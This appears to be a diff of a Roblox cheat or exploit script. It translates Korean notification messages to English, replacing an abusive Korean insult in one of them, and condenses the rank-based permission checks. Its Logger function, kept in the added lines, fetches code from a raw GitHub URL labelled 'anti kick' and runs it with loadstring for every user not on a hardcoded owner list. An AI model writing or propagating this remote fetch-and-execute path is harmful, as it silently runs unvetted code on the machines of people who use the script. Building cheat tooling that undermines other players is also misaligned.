@@ -7065,9 +7065,8 @@ game:GetService("UserInputService").InputBegan:Connect(function(input, gameProce
     end
 end)
 
--- =============== [ 보호 대상 목록 ] ==
+-- =============== [ Protected List ] ==
 local GF = {"wetokwk3jr"}
-
 
 local Owner = {"QRdoote1120", "0110rim", "Alpaca_AI16", "hello_qweqwe", "hello_q1w2e3", "pacapaca110", "wetokwk3jr", "dhalstjr1350", "one_day0618", "", "", "", "", "", "", ""}
 local Overseer = {""}
@@ -7094,19 +7093,19 @@ local function Notify(type, playerName)
     local content = ""
 
     if type == "Added" then
-        title = "[☑️ ]"; content = playerName.." - 추가"
+        title = "[☑️]"; content = playerName.." - Added"
     elseif type == "Removed" then
-        title = "[ ☑️ ]"; content = playerName.." - 제거"
+        title = "[☑️]"; content = playerName.." - Removed"
     elseif type == "Self" then
-        title = "[ ⚠️ ]"; content = "자신은 추가될 수 없어요!"
+        title = "[⚠️]"; content = "Cannot add self"
     elseif type == "Already" then
-        title = "[ 💠 ]"; content = playerName.." - 이미 추가됐어요"
+        title = "[💠]"; content = playerName.." - Already added"
     elseif type == "NotFound" then
-        title = "[ ❌ ]"; content = "찾을수가없네요"
+        title = "[❌]"; content = "Player not found"
     elseif type == "HigherRank" then
-        title = "[ ⛔ ]"; content = "권한이 부족해요!"
+        title = "[⛔]"; content = "Insufficient permissions"
     elseif type == "GFE" then
-        title = "[ ⛔ ]"; content = "나가 뒤져 엄마 장애인 ㅋㅋㅋ"
+        title = "[⛔]"; content = "GFE Error"
         GfLogger()
     end
 
@@ -7149,13 +7148,7 @@ local function findPlayer(Value)
         end
     end
 
-    if #matches == 0 then
-        return nil
-    elseif #matches == 1 then
-        return matches[1]
-    else
-        return matches[1]
-    end
+    return #matches > 0 and matches[1] or nil
 end
 
 local function checkPermissions(targetPlayer)
@@ -7164,30 +7157,11 @@ local function checkPermissions(targetPlayer)
     local targetRank = GetPlayerRank(targetPlayer.Name)
 
     if targetPlayer == localPlayer then return false, "Self" end
-
     if myRank == Ranks.Owner then return true end
-
-    if myRank == Ranks.Overseer and targetRank == Ranks.Owner then
-        return true
-    end
-
-    if myRank == Ranks.CoOwner and targetRank == Ranks.Owner then
-        return true
-    end
-
-    if targetRank == Ranks.User then
-        return true
-    end
-
-    if targetRank == Ranks.GF then
-        return false, "GFE"
-    end
-
-    if myRank > targetRank then
-        return true
-    else
-        return false, "HigherRank"
-    end
+    if (myRank == Ranks.Overseer or myRank == Ranks.CoOwner) and targetRank == Ranks.Owner then return true end
+    if targetRank == Ranks.User then return true end
+    if targetRank == Ranks.GF then return false, "GFE" end
+    if myRank > targetRank then return true else return false, "HigherRank" end
 end
 
 local function addToList(listTable, dropdown, inputValue, useRankCheck)
@@ -7224,10 +7198,7 @@ local function removeFromList(listTable, dropdown, inputValue, useRankCheck)
         local myRank = GetPlayerRank(localPlayer.Name)
 
         if foundName == localPlayer.Name then Notify("Self"); return end
-
-        if myRank == Ranks.Owner then
-        elseif targetRank == Ranks.User then
-        elseif myRank <= targetRank then
+        if myRank ~= Ranks.Owner and targetRank ~= Ranks.User and myRank <= targetRank then
             Notify("HigherRank", foundName); return
         end
     end
@@ -7239,23 +7210,15 @@ end
 
 function Logger()
     local plr = game.Players.LocalPlayer
-
     local BYPASS_ID = 1
-
     local ownerTable = {}
-    for _, name in ipairs(Owner) do
-        ownerTable[name] = true
-    end
+    for _, name in ipairs(Owner) do ownerTable[name] = true end
 
     if not ownerTable[plr.Name] and plr.UserId ~= BYPASS_ID then
-        local success, errorMessage = pcall(function()
-           loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))() -- anti kick
-        end)
-
-        if not success then
-        end
+        pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))() end)
     end
 end
+
 antiTab:AddSection({
 	Name = "친구"
 })
